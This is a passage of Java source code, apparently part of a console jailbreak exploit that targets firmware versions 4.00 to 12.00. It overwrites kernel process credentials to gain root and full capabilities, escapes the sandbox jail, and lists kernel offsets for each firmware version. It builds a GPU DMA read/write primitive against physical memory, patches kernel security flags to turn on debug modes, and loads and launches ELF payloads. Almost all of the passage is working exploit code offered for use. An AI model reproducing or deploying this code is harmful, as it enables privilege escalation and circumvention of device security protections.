    kapi.kwrite32(p_ucred + 0x08, 0); // cr_ruid
    kapi.kwrite32(p_ucred + 0x0C, 0); // cr_svuid
    kapi.kwrite32(p_ucred + 0x10, 1); // cr_ngroups
    kapi.kwrite32(p_ucred + 0x14, 0); // cr_rgid
    kapi.kwrite32(p_ucred + 0x18, 0); // cr_svgid
    kapi.kwrite64(p_ucred + 0x30, prison0); // cr_prison
    kapi.kwrite64(p_ucred + 0x58, SYSCORE_AUTHID); // cr_sceAuthId
    kapi.kwrite64(p_ucred + 0x60, 0xFFFFFFFFFFFFFFFFL); // cr_sceCaps[0]
    kapi.kwrite64(p_ucred + 0x68, 0xFFFFFFFFFFFFFFFFL); // cr_sceCaps[1]
    kapi.kwrite8(p_ucred + 0x83, (byte) 0x80); // cr_sceAttr[0]

    // Allow root file system access.
    long rootvnode = getRootVnode();
    long p_fd = kapi.kread64(p + 0x48);
    kapi.kwrite64(p_fd + 0x08, rootvnode); // fd_cdir
    kapi.kwrite64(p_fd + 0x10, rootvnode); // fd_rdir
    kapi.kwrite64(p_fd + 0x18, 0); // fd_jdir

    // Allow syscall from everywhere.
    long p_dynlib = kapi.kread64(p + 0x3e8);
    kapi.kwrite64(p_dynlib + 0xf0, 0); // start
    kapi.kwrite64(p_dynlib + 0xf8, 0xFFFFFFFFFFFFFFFFL); // end

    // Allow dlsym.
    long dynlib_eboot = kapi.kread64(p_dynlib + 0x00);
    long eboot_segments = kapi.kread64(dynlib_eboot + 0x40);
    kapi.kwrite64(eboot_segments + 0x08, 0); // addr
    kapi.kwrite64(eboot_segments + 0x10, 0xFFFFFFFFFFFFFFFFL); // size
  }

  private void saveFlowRestoreState(long curproc) {
    try {
      long procUcred = kapi.kread64(curproc + 0x40);
      long procFd = kapi.kread64(curproc + 0x48);
      savedProcUcred = procUcred;
      savedProcFd = procFd;
      savedFdCdir = kapi.kread64(procFd + FD_CDIR);
      savedFdRdir = kapi.kread64(procFd + FD_RDIR);
      savedFdJdir = kapi.kread64(procFd + FD_JDIR);
      savedPrison = kapi.kread64(procUcred + UCRED_CR_PRISON);
      log("[+] Cleanup safety: original filesystem root and jail state captured.");
    } catch (Throwable e) {
      log("[!] Cleanup safety: could not capture original filesystem root and jail state: ".concat(String.valueOf(e)));
    }
  }

  private void nullKernelApiPipeFds() {
    try {
      int mr = kapi.getMasterPipeFd().get(0);
      int mw = kapi.getMasterPipeFd().get(1);
      int vr = kapi.getVictimPipeFd().get(0);
      int vw = kapi.getVictimPipeFd().get(1);
      kapi.kwrite64(fdt_ofiles + mr * FILEDESCENT_SIZE, 0);
      kapi.kwrite64(fdt_ofiles + mw * FILEDESCENT_SIZE, 0);
      kapi.kwrite64(fdt_ofiles + vr * FILEDESCENT_SIZE, 0);
      kapi.kwrite64(fdt_ofiles + vw * FILEDESCENT_SIZE, 0);
    } catch (Throwable e) {
    }
  }

  private boolean resolveTailSyscalls() {
    try {
      libkernel = api.dlsym(API.RTLD_DEFAULT, "libkernel.sprx");
      if (libkernel == 0) {
        libkernel = API.LIBKERNEL_MODULE_HANDLE;
      }

      tail_getpid = getpid;
      tail_ioctl = ioctl;
      tail_pipe = pipe;
      tail_socket = socket;
      tail_setsockopt = setsockopt;
      tail_schedYield = sched_yield;

      tail_scePthreadCreate = api.dlsym(libkernel, "scePthreadCreate");
      tail_open = api.dlsym(libkernel, "open");
      tail_mprotect = api.dlsym(libkernel, "mprotect");
      tail_nanosleep = api.dlsym(libkernel, "nanosleep");
      tail_allocDmem = api.dlsym(libkernel, "sceKernelAllocateMainDirectMemory");
      tail_mapDmem = api.dlsym(libkernel, "sceKernelMapDirectMemory");
      tail_mmap = api.dlsym(libkernel, "mmap");
      tail_jitshmCreate = api.dlsym(libkernel, "sceKernelJitCreateSharedMemory");
      tail_jitshmAlias = api.dlsym(libkernel, "sceKernelJitCreateAliasOfSharedMemory");
      tail_sysctlbyname = api.dlsym(libkernel, "sysctlbyname");
      tail_pthreadAttrInit = api.dlsym(libkernel, "scePthreadAttrInit");
      tail_pthreadAttrSetstacksize = api.dlsym(libkernel, "scePthreadAttrSetstacksize");
      tail_pthreadAttrSetdetachstate = api.dlsym(libkernel, "scePthreadAttrSetdetachstate");
      tail_pthreadAttrDestroy = api.dlsym(libkernel, "scePthreadAttrDestroy");

      return tail_getpid != 0
              && tail_ioctl != 0
              && tail_pipe != 0
              && tail_socket != 0
              && tail_setsockopt != 0
              && tail_schedYield != 0
              && tail_scePthreadCreate != 0
              && tail_open != 0
              && tail_mprotect != 0
              && tail_nanosleep != 0
              && tail_allocDmem != 0
              && tail_mapDmem != 0
              && tail_mmap != 0
              && tail_jitshmCreate != 0
              && tail_jitshmAlias != 0
              && tail_sysctlbyname != 0
              && tail_pthreadAttrInit != 0
              && tail_pthreadAttrSetstacksize != 0
              && tail_pthreadAttrDestroy != 0;
    } catch (Throwable e) {
      return false;
    }
  }

  private static String hx64(long value) {
    String hex = Long.toHexString(value);
    while (hex.length() < 16) {
      hex = "0".concat(hex);
    }
    return "0x".concat(hex);
  }

  private static boolean looksKernelPtr(long value) {
    return value != 0 && (value & 0xFFFF000000000000L) == 0xFFFF000000000000L;
  }

  private static void ksleep(long millis) {
    if (ksleepTs == null) {
      ksleepTs = new Buffer(16);
    }
    ksleepTs.putLong(0, millis / 1000L);
    ksleepTs.putLong(8, (millis % 1000L) * 1000000L);
    api.call(tail_nanosleep, ksleepTs.address(), 0L);
  }

  private static void kread(long kaddr, Buffer dest, int size) {
    kapi.kread(dest, kaddr, size);
  }

  private static long kread64(long kaddr) {
    return kapi.kread64(kaddr);
  }

  private static int kread32(long kaddr) {
    return kapi.kread32(kaddr);
  }

  private static void kwrite64(long kaddr, long value) {
    kapi.kwrite64(kaddr, value);
  }

  private static void kwrite32(long kaddr, int value) {
    kapi.kwrite32(kaddr, value);
  }

  private static void kwrite8(long kaddr, byte value) {
    kapi.kwrite8(kaddr, value);
  }

  private static boolean initOffsets(String fw) {
    if (fw == null) {
      return false;
    }

    int major = 0;
    int minor = 0;

    try {
      int dotIndex = fw.indexOf('.');
      if (dotIndex > 0) {
        major = Integer.parseInt(fw.substring(0, dotIndex));
        minor = Integer.parseInt(fw.substring(dotIndex + 1));
      } else {
        major = Integer.parseInt(fw);
      }
    } catch (Throwable e) {
      return false;
    }

    String targetFw = "";
    if (major == 4) {
      targetFw = "4.00";
    } else if (major == 5) {
      if (minor >= 50) {
        targetFw = "5.50";
      } else {
        targetFw = "5.00";
      }
    } else if (major == 6) {
      targetFw = "6.00";
    } else if (major == 7) {
      targetFw = "7.00";
    } else if (major == 8) {
      targetFw = "8.00";
    } else if (major == 9) {
      if (minor == 0) {
        targetFw = "9.00";
      } else {
        targetFw = "9.05";
      }
    } else if (major == 10) {
      targetFw = "10.00";
    } else if (major == 11) {
      targetFw = "11.00";
    } else if (major == 12) {
      targetFw = "12.00";
    } else {
      return false;
    }

    if (targetFw.equals("4.00")) {
      DATA_BASE_OFF = 0x0C00000L; ALLPROC = 0x027EDCB8L; SECURITY_FLAGS = 0x06506474L; ROOTVNODE = 0x066E74C0L; KERNEL_PMAP_STORE = 0x03257A78L; GVMSPACE = 0x064C3F80L;
    } else if (targetFw.equals("5.00")) {
      DATA_BASE_OFF = 0x0C40000L; ALLPROC = 0x0291DD00L; SECURITY_FLAGS = 0x066466ECL; ROOTVNODE = 0x06853510L; KERNEL_PMAP_STORE = 0x03398A88L; GVMSPACE = 0x06603FB0L;
    } else if (targetFw.equals("5.50")) {
      DATA_BASE_OFF = 0x0C40000L; ALLPROC = 0x0291DD00L; SECURITY_FLAGS = 0x066466ECL; ROOTVNODE = 0x06853510L; KERNEL_PMAP_STORE = 0x03394A88L; GVMSPACE = 0x06603FB0L;
    } else if (targetFw.equals("6.00")) {
      DATA_BASE_OFF = 0x0C60000L; ALLPROC = 0x02869D20L; SECURITY_FLAGS = 0x065968ECL; ROOTVNODE = 0x0679F510L; KERNEL_PMAP_STORE = 0x032E4358L; GVMSPACE = 0x065540F0L;
    } else if (targetFw.equals("7.00")) {
      DATA_BASE_OFF = 0x0C50000L; ALLPROC = 0x02859D50L; SECURITY_FLAGS = 0x00AC8064L; ROOTVNODE = 0x030C7510L; KERNEL_PMAP_STORE = 0x02E2C848L; GVMSPACE = 0x02E76090L;
    } else if (targetFw.equals("8.00")) {
      DATA_BASE_OFF = 0x0C70000L; ALLPROC = 0x02875D50L; SECURITY_FLAGS = 0x00AC3064L; ROOTVNODE = 0x030FB510L; KERNEL_PMAP_STORE = 0x02E48848L; GVMSPACE = 0x02EAA090L;
    } else if (targetFw.equals("9.00")) {
      DATA_BASE_OFF = 0x0CA0000L; ALLPROC = 0x02755D50L; SECURITY_FLAGS = 0x00D72064L; ROOTVNODE = 0x02FDB510L; KERNEL_PMAP_STORE = 0x02D28B78L; GVMSPACE = 0x02D8A570L;
    } else if (targetFw.equals("9.05")) {
      DATA_BASE_OFF = 0x0CA0000L; ALLPROC = 0x02755D50L; SECURITY_FLAGS = 0x00D73064L; ROOTVNODE = 0x02FDB510L; KERNEL_PMAP_STORE = 0x02D28B78L; GVMSPACE = 0x02D8A570L;
    } else if (targetFw.equals("10.00")) {
      DATA_BASE_OFF = 0x0CC0000L; ALLPROC = 0x02765D70L; SECURITY_FLAGS = 0x00D79064L; ROOTVNODE = 0x02FA3510L; KERNEL_PMAP_STORE = 0x02CF0EF8L; GVMSPACE = 0x02D52570L;
    } else if (targetFw.equals("11.00")) {
      DATA_BASE_OFF = 0x0D30000L; ALLPROC = 0x02875D70L; SECURITY_FLAGS = 0x00D8C064L; ROOTVNODE = 0x030B7510L; KERNEL_PMAP_STORE = 0x02E04F18L; GVMSPACE = 0x02E66570L;
    } else if (targetFw.equals("12.00")) {
      DATA_BASE_OFF = 0x0D50000L; ALLPROC = 0x02885E00L; SECURITY_FLAGS = 0x00D83064L; ROOTVNODE = 0x030D7510L; KERNEL_PMAP_STORE = 0x02E1CFB8L; GVMSPACE = 0x02E7E570L;
    }
    return true;
  }

  private static long findDataBase(long proc) {
    long p = proc;
    for (int i = 0; i < 512; i++) {
      p = kread64(p + 0x08);
      if (p == 0 || (p >>> 48) != 0xFFFFL) {
        break;
      }
      if ((p >>> 32) == 0xFFFFFFFFL) {
        long candidate = p - ALLPROC;
        if ((candidate & 0xFFF) == 0) {
          if (ROOTVNODE != 0) {
            long rvn = kread64(candidate + ROOTVNODE);
            if (rvn != 0 && (rvn >>> 48) == 0xFFFFL) {
              return candidate;
            }
            continue;
          }
          return candidate;
        }
      }
    }
    return 0;
  }

  private static long findDataBaseFromKnownAllproc(long knownAllproc) {
    if (knownAllproc == 0 || ALLPROC == 0) {
      return 0;
    }

    long candidate = knownAllproc - ALLPROC;
    if ((candidate & 0xFFF) != 0) {
      return 0;
    }

    if (ROOTVNODE != 0) {
      long rvn = kread64(candidate + ROOTVNODE);
      if (rvn == 0 || (rvn >>> 48) != 0xFFFFL) {
        return 0;
      }
    }

    return candidate;
  }

  private static void restoreJailbreak() {
    if (savedProcFd == 0) {
      return;
    }

    kwrite64(savedProcFd + FD_CDIR, savedFdCdir);
    kwrite64(savedProcFd + FD_RDIR, savedFdRdir);
    kwrite64(savedProcFd + FD_JDIR, savedFdJdir);

    if (savedProcUcred != 0 && savedPrison != 0) {
      kwrite64(savedProcUcred + UCRED_CR_PRISON, savedPrison);
    }
  }

  private static String getRealFirmware() {
    if (tail_sysctlbyname == 0) {
      return null;
    }

    try {
      Buffer nameBuf = new Buffer(32);
      nameBuf.put(0, "kern.sdk_version\0".getBytes());
      Buffer outBuf = new Buffer(8);
      Buffer sizeBuf = new Buffer(8);
      sizeBuf.putLong(0, 8);
      long ret = api.call(tail_sysctlbyname, nameBuf.address(), outBuf.address(), sizeBuf.address(), 0, 0);
      if (ret == 0) {
        int minor = outBuf.getByte(2) & 0xFF;
        int major = outBuf.getByte(3) & 0xFF;
        String majorStr = Integer.toHexString(major);
        String minorStr = Integer.toHexString(minor);
        if (minorStr.length() == 1) {
          minorStr = "0".concat(minorStr);
        }
        return majorStr.concat(".").concat(minorStr);
      }
    } catch (Throwable e) {}

    return null;
  }

  private static String getConsoleIp() {
    try {
      java.util.Enumeration interfaces = java.net.NetworkInterface.getNetworkInterfaces();
      while (interfaces != null && interfaces.hasMoreElements()) {
        java.net.NetworkInterface iface = (java.net.NetworkInterface) interfaces.nextElement();
        if (iface == null || !iface.isUp() || iface.isLoopback()) {
          continue;
        }

        java.util.Enumeration addresses = iface.getInetAddresses();
        while (addresses != null && addresses.hasMoreElements()) {
          java.net.InetAddress addr = (java.net.InetAddress) addresses.nextElement();
          if (addr == null || addr.isLoopbackAddress()) {
            continue;
          }
          if (addr instanceof java.net.Inet4Address) {
            String ip = addr.getHostAddress();
            if (ip != null && ip.length() > 0 && !"0.0.0.0".equals(ip) && !"127.0.0.1".equals(ip)) {
              return ip;
            }
          }
        }
      }
    } catch (Throwable e) {}

    return "127.0.0.1";
  }

  private static boolean sendElf(String resourcePath) {
    java.io.InputStream input = null;
    java.io.OutputStream output = null;
    java.net.Socket socket = null;
    String targetIp = getConsoleIp();

    try {
      input = Poops.class.getResourceAsStream(resourcePath);
      if (input == null) {
        log("[!] Resource not found in JAR: ".concat(resourcePath));
        return false;
      }
      log("[*] Sending ".concat(resourcePath).concat(" to ")
              .concat(targetIp).concat(":9021..."));
      socket = new java.net.Socket();
      socket.connect(new java.net.InetSocketAddress(targetIp, 9021), 500);
      output = socket.getOutputStream();

      byte[] temp = new byte[4096];
      int readLen;
      while ((readLen = input.read(temp)) != -1) {
        output.write(temp, 0, readLen);
      }
      output.flush();
      log("[+] Sent ".concat(resourcePath).concat(" to ")
              .concat(targetIp).concat(":9021."));
      return true;
    } catch (java.io.IOException e) {
      log("[!] Failed to send ".concat(resourcePath).concat(": ").concat(String.valueOf(e)));
      return false;
    } finally {
      if (output != null) {
        try { output.close(); } catch (java.io.IOException e) {}
      }
      if (socket != null) {
        try { socket.close(); } catch (java.io.IOException e) {}
      }
      if (input != null) {
        try { input.close(); } catch (java.io.IOException e) {}
      }
    }
  }

  private static class GPU {
    private static final long GPU_PDE_ADDR_MASK = 0x0000FFFFFFFFFFC0L;
    private static final long CPU_PHYS_MASK = 0x000FFFFFFFFFF000L;
    private static final int PROT_READ = 0x01;
    private static final int PROT_WRITE = 0x02;
    private static final int GPU_READ = 0x10;
    private static final int GPU_WRITE = 0x20;
    private static final int MAP_NO_COALESCE = 0x400000;
    private static final long DMEM_SIZE = 2 * 0x100000L;

    private static long dmapBase;
    private static long kernelCr3;
    private static int gpuFd = -1;
    private static long victimVa;
    private static long transferVa;
    private static long cmdVa;
    private static long clearedVictimPtbeForRo;
    private static long victimPtbeVa;

    private static Buffer ioctlDesc = new Buffer(16);
    private static Buffer ioctlSub = new Buffer(16);
    private static Buffer ioctlTs = new Buffer(16);
    private static Buffer devGcPath = new Buffer(8);

    private static long physToDmap(long pa) {
      return dmapBase + pa;
    }

    private static long virtToPhys(long va, long cr3) {
      long pml4e = kread64(physToDmap(cr3) + ((va >>> 39) & 0x1FF) * 8);
      if (pml4e == 0 || (pml4e & 1) == 0) return 0;
      long pdpte = kread64(physToDmap(pml4e & CPU_PHYS_MASK) + ((va >>> 30) & 0x1FF) * 8);
      if (pdpte == 0 || (pdpte & 1) == 0) return 0;
      if ((pdpte & 0x80) != 0) return (pdpte & 0x000FFFFFC0000000L) | (va & 0x3FFFFFFFL);
      long pde = kread64(physToDmap(pdpte & CPU_PHYS_MASK) + ((va >>> 21) & 0x1FF) * 8);
      if (pde == 0 || (pde & 1) == 0) return 0;
      if ((pde & 0x80) != 0) return (pde & 0x000FFFFFFFE00000L) | (va & 0x1FFFFFL);
      long pte = kread64(physToDmap(pde & CPU_PHYS_MASK) + ((va >>> 12) & 0x1FF) * 8);
      if (pte == 0 || (pte & 1) == 0) return 0;
      return (pte & CPU_PHYS_MASK) | (va & 0xFFFL);
    }

    private static long getProcCr3(long proc) {
      long vmspace = kread64(proc + PROC_VM_SPACE);
      if (vmspace == 0 || (vmspace >>> 48) != 0xFFFFL) return 0;
      for (int i = 1; i <= 6; i++) {
        long val = kread64(vmspace + 0x1C8 + i * 8);
        long diff = val - vmspace;
        if (diff >= 0x2C0 && diff <= 0x2F0) return kread64(val + PMAP_CR3);
      }
      return 0;
    }

    private static long getVmid(long proc) {
      long vmspace = kread64(proc + PROC_VM_SPACE);
      for (int i = 1; i <= 8; i++) {
        int val = kread32(vmspace + 0x1D4 + i * 4);
        if (val > 0 && val <= 0x10) return val;
      }
      return 0;
    }

    private static long gpuPdeField(long pde, int shift) {
      return (pde >>> shift) & 1;
    }

    private static long gpuPdeFrag(long pde) {
      return (pde >>> 59) & 0x1F;
    }

    private static long[] gpuWalkPt(long vmid, long virtAddr) {
      long gvmspace = dataBase + GVMSPACE + vmid * SIZEOF_GVMSPACE;
      long pdb2Addr = kread64(gvmspace + GVMSPACE_PAGE_DIR);

      long pml4e = kread64(pdb2Addr + ((virtAddr >>> 39) & 0x1FF) * 8);
      if (gpuPdeField(pml4e, 0) != 1) return null;

      long pdpPa = pml4e & GPU_PDE_ADDR_MASK;
      long pdpe = kread64(physToDmap(pdpPa) + ((virtAddr >>> 30) & 0x1FF) * 8);
      if (gpuPdeField(pdpe, 0) != 1) return null;

      long pdPa = pdpe & GPU_PDE_ADDR_MASK;
      long pdeIdx = (virtAddr >>> 21) & 0x1FF;
      long pde = kread64(physToDmap(pdPa) + pdeIdx * 8);
      if (gpuPdeField(pde, 0) != 1) return null;

      if (gpuPdeField(pde, 54) == 1) return new long[]{physToDmap(pdPa) + pdeIdx * 8, 0x200000};

      long frag = gpuPdeFrag(pde);
      long offset = virtAddr & 0x1FFFFF;
      long ptPa = pde & GPU_PDE_ADDR_MASK;
      long pteIdx;
      long pageSize;

      if (frag == 4) {
        pteIdx = offset >>> 16;
        long pte = kread64(physToDmap(ptPa) + pteIdx * 8);
        if (gpuPdeField(pte, 0) == 1 && gpuPdeField(pte, 56) == 1) {
          pteIdx = (virtAddr & 0xFFFF) >>> 13;
          pageSize = 0x2000;
        } else {
          pageSize = 0x10000;
        }
      } else if (frag == 1) {
        pteIdx = offset >>> 13;
        pageSize = 0x2000;
      } else {
        return null;
      }

      return new long[]{physToDmap(ptPa) + pteIdx * 8, pageSize};
    }

    private static long[] getPtbEntry(long proc, long va) {
      long vmid = getVmid(proc);
      if (vmid == 0) return null;
      long gvmspace = dataBase + GVMSPACE + vmid * SIZEOF_GVMSPACE;
      long startVa = kread64(gvmspace + GVMSPACE_START_VA);
      long gvmSize = kread64(gvmspace + GVMSPACE_SIZE);
      if (va < startVa || va >= startVa + gvmSize) return null;
      return gpuWalkPt(vmid, va - startVa);
    }

    private static long[] allocMainDmem(long size, int prot, int flags) {
      Buffer out = new Buffer(8);
      if (api.call(tail_allocDmem, size, size, 1, out.address()) != 0) return null;
      long phys = out.getLong(0);
      out.putLong(0, 0);
      if (api.call(tail_mapDmem, out.address(), size, prot, flags, phys, size) != 0) return null;
      return new long[]{out.getLong(0), phys};
    }

    private static long pm4Type3Header(int opcode, int count) {
      return (0x02L | ((long)(opcode & 0xFF) << 8) | (((long)(count - 1) & 0x3FFF) << 16) | (0x03L << 30)) & 0xFFFFFFFFL;
    }

    private static int writePm4DmaTo(long bufVa, long dstVa, long srcVa, long length) {
      long dmaHdr = 0x8C00C000L;
      api.write32(bufVa + 0x00, (int) pm4Type3Header(0x50, 6));
      api.write32(bufVa + 0x04, (int) dmaHdr);
      api.write32(bufVa + 0x08, (int) (srcVa & 0xFFFFFFFFL));
      api.write32(bufVa + 0x0C, (int) ((srcVa >>> 32) & 0xFFFFFFFFL));
      api.write32(bufVa + 0x10, (int) (dstVa & 0xFFFFFFFFL));
      api.write32(bufVa + 0x14, (int) ((dstVa >>> 32) & 0xFFFFFFFFL));
      api.write32(bufVa + 0x18, (int) (length & 0x1FFFFFL));
      return 28;
    }

    private static boolean submitViaIoctl(long localCmdVa, int cmdSize) {
      long dwords = cmdSize >>> 2;
      ioctlDesc.putLong(0, ((localCmdVa & 0xFFFFFFFFL) << 32) | 0xC0023F00L);
      ioctlDesc.putLong(8, ((dwords & 0xFFFFFL) << 32) | ((localCmdVa >>> 32) & 0xFFFFL));
      ioctlSub.putInt(0, 0);
      ioctlSub.putInt(4, 1);
      ioctlSub.putLong(8, ioctlDesc.address());
      api.call(tail_ioctl, gpuFd, 0xC0108102L, ioctlSub.address());
      api.call(tail_nanosleep, ioctlTs.address(), 0);
      return true;
    }

    private static void transferPhys(long physAddr, long size, boolean isWrite) {
      long trunc = physAddr & ~(DMEM_SIZE - 1);
      long offset = physAddr - trunc;
      int protRo = PROT_READ | PROT_WRITE | GPU_READ;
      int protRw = protRo | GPU_WRITE;

      api.call(tail_mprotect, victimVa, DMEM_SIZE, protRo);
      kwrite64(victimPtbeVa, clearedVictimPtbeForRo | trunc);
      api.call(tail_mprotect, victimVa, DMEM_SIZE, protRw);

      long src = isWrite ? transferVa : (victimVa + offset);
      long dst = isWrite ? (victimVa + offset) : transferVa;
      submitViaIoctl(cmdVa, writePm4DmaTo(cmdVa, dst, src, size));
    }

    private static int read32(long kaddr) {
      long pa = virtToPhys(kaddr, kernelCr3);
      if (pa == 0) return 0;
      transferPhys(pa, 4, false);
      return api.read32(transferVa);
    }

    private static void write32(long kaddr, int val) {
      long pa = virtToPhys(kaddr, kernelCr3);
      if (pa == 0) return;
      api.write32(transferVa, val);
      transferPhys(pa, 4, true);
    }

    private static void write8(long kaddr, byte val) {
      long aligned = kaddr & 0xFFFFFFFFFFFFFFFCL;
      long byteoff = kaddr - aligned;
      int dw = read32(aligned);
      dw = (dw & ~(0xFF << (byteoff * 8))) | ((val & 0xFF) << (byteoff * 8));
      write32(aligned, dw);
    }

    private static boolean setup(long curproc) {
      devGcPath.put(0, "/dev/gc\0".getBytes());
      gpuFd = (int) api.call(tail_open, devGcPath.address(), 2, 0);
      if (gpuFd < 0) return false;

      ioctlTs.putLong(0, 0);
      ioctlTs.putLong(8, 10000L);

      long pmapStore = dataBase + KERNEL_PMAP_STORE;
      long pmPml4 = kread64(pmapStore + PMAP_PML4);
      long pmCr3 = kread64(pmapStore + PMAP_CR3);
      dmapBase = pmPml4 - pmCr3;
      kernelCr3 = pmCr3;

      int protRw = PROT_READ | PROT_WRITE | GPU_READ | GPU_WRITE;
      long[] v = allocMainDmem(DMEM_SIZE, protRw, MAP_NO_COALESCE);
      long[] t = allocMainDmem(DMEM_SIZE, protRw, MAP_NO_COALESCE);
      long[] c = allocMainDmem(DMEM_SIZE, protRw, MAP_NO_COALESCE);
      if (v == null || t == null || c == null) return false;

      victimVa = v[0];
      transferVa = t[0];
      cmdVa = c[0];

      long procCr3 = getProcCr3(curproc);
      long victimRealPa = virtToPhys(victimVa, procCr3);
      long[] ptb = getPtbEntry(curproc, victimVa);
      if (ptb == null || ptb[1] != DMEM_SIZE) return false;

      victimPtbeVa = ptb[0];
      api.call(tail_mprotect, victimVa, DMEM_SIZE, PROT_READ | PROT_WRITE | GPU_READ);
      long initialPtbe = kread64(victimPtbeVa);
      clearedVictimPtbeForRo = initialPtbe & (~victimRealPa);
      api.call(tail_mprotect, victimVa, DMEM_SIZE, protRw);
      return true;
    }

    private static void patchDebug() {
      long secFlagsAddr = dataBase + SECURITY_FLAGS;
      int sf = read32(secFlagsAddr);
      write32(secFlagsAddr, sf | 0x14);
      write8(secFlagsAddr + 0x09, (byte) 0x82);
      int qa = read32(secFlagsAddr + 0x24);
      write32(secFlagsAddr + 0x24, qa | 0x10300);
      long utAddr = secFlagsAddr + 0x8C;
      long utAligned = utAddr & 0xFFFFFFFFFFFFFFFCL;
      long utByte = utAddr - utAligned;
      int utDw = read32(utAligned);
      int utVal = (utDw >>> (utByte * 8)) & 0xFF;
      int newDw = (utDw & ~(0xFF << (utByte * 8))) | (((utVal | 0x01) & 0xFF) << (utByte * 8));
      write32(utAligned, newDw);
    }
  }

  private static class ElfLoader {
    private static final long MAPPING_ADDR = 0x926100000L;
    private static final long SHADOW_MAPPING_ADDR = 0x920100000L;

    private static Buffer rwpipe;
    private static Buffer rwpair;
    private static Buffer payloadout;
    private static Buffer args;
    private static Buffer th;
    private static Buffer at;
    private static Buffer threadName;

    /*
    private static String hx(long value) {
      return "0x".concat(Long.toHexString(value));
    }
    */

    private static Buffer loadElfFromJar(String resourcePath) {
      try {
        log("[*] Loading ELF (".concat(resourcePath).concat(") from JAR..."));
        java.io.InputStream is = Poops.class.getResourceAsStream(resourcePath);
        if (is == null) return null;
        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
        byte[] tempBuf = new byte[8192];
        int readLen;
        while ((readLen = is.read(tempBuf)) != -1) {
          baos.write(tempBuf, 0, readLen);
        }
        byte[] elfBytes = baos.toByteArray();
        Buffer store = new Buffer(elfBytes.length);
        store.put(0, elfBytes);
        if (store.getInt(0) != 0x464C457F) return null;
        return store;
      } catch (Throwable e) {
        return null;
      }
    }

    private static long mapElf(Buffer store) {
      log("[*] Mapping ELF into JIT memory...");
      long e_entry = store.getLong(0x18);
      long e_phoff = store.getLong(0x20);
      long e_shoff = store.getLong(0x28);
      int e_phnum = store.getShort(0x38) & 0xFFFF;
      int e_shnum = store.getShort(0x3C) & 0xFFFF;
      long exec_start = 0;
      long exec_end = 0;

      for (int i = 0; i < e_phnum; i++) {
        long ph = store.address() + e_phoff + i * 0x38;
        int p_type = api.read32(ph);
        int p_flags = api.read32(ph + 4);
        long p_off = api.read64(ph + 0x08);
        long p_vaddr = api.read64(ph + 0x10);
        long p_filesz = api.read64(ph + 0x20);
        long p_memsz = api.read64(ph + 0x28);

        if (p_type == 1) {
          long aligned = (p_memsz + 0x3FFF) & 0xFFFFC000L;
          long expectedMap = MAPPING_ADDR + p_vaddr;
          if ((p_flags & 1) == 1) {
            exec_start = p_vaddr;
            exec_end = p_vaddr + p_memsz;

            Buffer fdBuf = new Buffer(8);
            long retCreate = api.call(tail_jitshmCreate, 0L, aligned, 7L, fdBuf.address());
            int eh = fdBuf.getInt(0);
            long retAlias = api.call(tail_jitshmAlias, eh, 3L, fdBuf.address());
            int wh = fdBuf.getInt(0);
            long mmapRes = api.call(tail_mmap, SHADOW_MAPPING_ADDR, aligned, 3L, 0x11, wh, 0);

            if (retCreate != 0 || retAlias != 0 || eh <= 0 || wh <= 0 || mmapRes < 0) {
              return 0;
            }
            if (mmapRes != SHADOW_MAPPING_ADDR) {
              return 0;
            }

            if (p_filesz > 0) api.memcpy(SHADOW_MAPPING_ADDR, store.address() + p_off, p_filesz);
            if (p_memsz > p_filesz) api.memset(SHADOW_MAPPING_ADDR + p_filesz, 0, (int) (p_memsz - p_filesz));

            long mmapRes2 = api.call(tail_mmap, MAPPING_ADDR + p_vaddr, aligned, 5L, 0x11, eh, 0);
            if (mmapRes2 < 0) {
              return 0;
            }
            if (mmapRes2 != expectedMap) {
              return 0;
            }
          } else {
            long mmapRes3 = api.call(tail_mmap, MAPPING_ADDR + p_vaddr, aligned, 3L, 0x1012, 0xFFFFFFFFL, 0);
            if (mmapRes3 < 0) {
              return 0;
            }
            if (mmapRes3 != expectedMap) {
              return 0;
            }
            if (p_filesz > 0) api.memcpy(MAPPING_ADDR + p_vaddr, store.address() + p_off, p_filesz);
          }
        }
      }

      for (int i = 0; i < e_shnum; i++) {
        long sh = store.address() + e_shoff + i * 0x40;
        if (api.read32(sh + 4) == 4) {
          long sh_off = api.read64(sh + 0x18);
          long sh_size = api.read64(sh + 0x20);
          for (int j = 0; j < (sh_size / 0x18); j++) {
            long r = store.address() + sh_off + j * 0x18;
            long r_offset = api.read64(r);
            long r_info = api.read64(r + 8);
            long r_addend = api.read64(r + 0x10);

            if ((r_info & 0xFF) == 0x08) {
              long dst = (r_offset >= exec_start && r_offset < exec_end) ? (SHADOW_MAPPING_ADDR + r_offset) : (MAPPING_ADDR + r_offset);
              api.write64(dst, MAPPING_ADDR + r_addend);
            }
          }
        }
      }
      return MAPPING_ADDR + e_entry;
    }

    private static long[] createElfPipes(long fdOfiles) {
      Int32Array pipeFd = new Int32Array(2);
      if (api.call(tail_pipe, pipeFd.address()) != 0) return null;
      int rfd = pipeFd.get(0);
      int wfd = pipeFd.get(1);

      long prfp = 0;
      for (int i = 0; i < 100; i++) {
        prfp = kread64(fdOfiles + rfd * FILEDESCENT_SIZE);
        if (prfp != 0) break;
        api.call(tail_schedYield);
      }
      if (prfp == 0) return null;

      long kpipe = kread64(prfp);
      if (kpipe == 0) return null;

      long pwfp = 0;
      for (int i = 0; i < 100; i++) {
        pwfp = kread64(fdOfiles + wfd * FILEDESCENT_SIZE);
        if (pwfp != 0) break;
        api.call(tail_schedYield);
      }
      if (pwfp == 0) return null;

      kwrite32(prfp + 0x28, kread32(prfp + 0x28) + 1);
      kwrite32(pwfp + 0x28, kread32(pwfp + 0x28) + 1);
      return new long[]{rfd, wfd, kpipe};
    }

    private static long[] createOverlappedSockets(long fdOfiles) {
      int ms = (int) api.call(tail_socket, AF_INET6, 2, 17);
      int vs = (int) api.call(tail_socket, AF_INET6, 2, 17);
      if (ms < 0 || vs < 0) return null;

      Buffer mbuf = new Buffer(20);
      mbuf.fill((byte) 0);
      api.call(tail_setsockopt, ms, IPPROTO_IPV6, 46, mbuf.address(), 20);
      Buffer vbuf = new Buffer(20);
      vbuf.fill((byte) 0);
      api.call(tail_setsockopt, vs, IPPROTO_IPV6, 46, vbuf.address(), 20);

      long mfp = 0;
      long vfp = 0;
      for (int i = 0; i < 100; i++) {
        if (mfp == 0) mfp = kread64(fdOfiles + ms * FILEDESCENT_SIZE);
        if (vfp == 0) vfp = kread64(fdOfiles + vs * FILEDESCENT_SIZE);
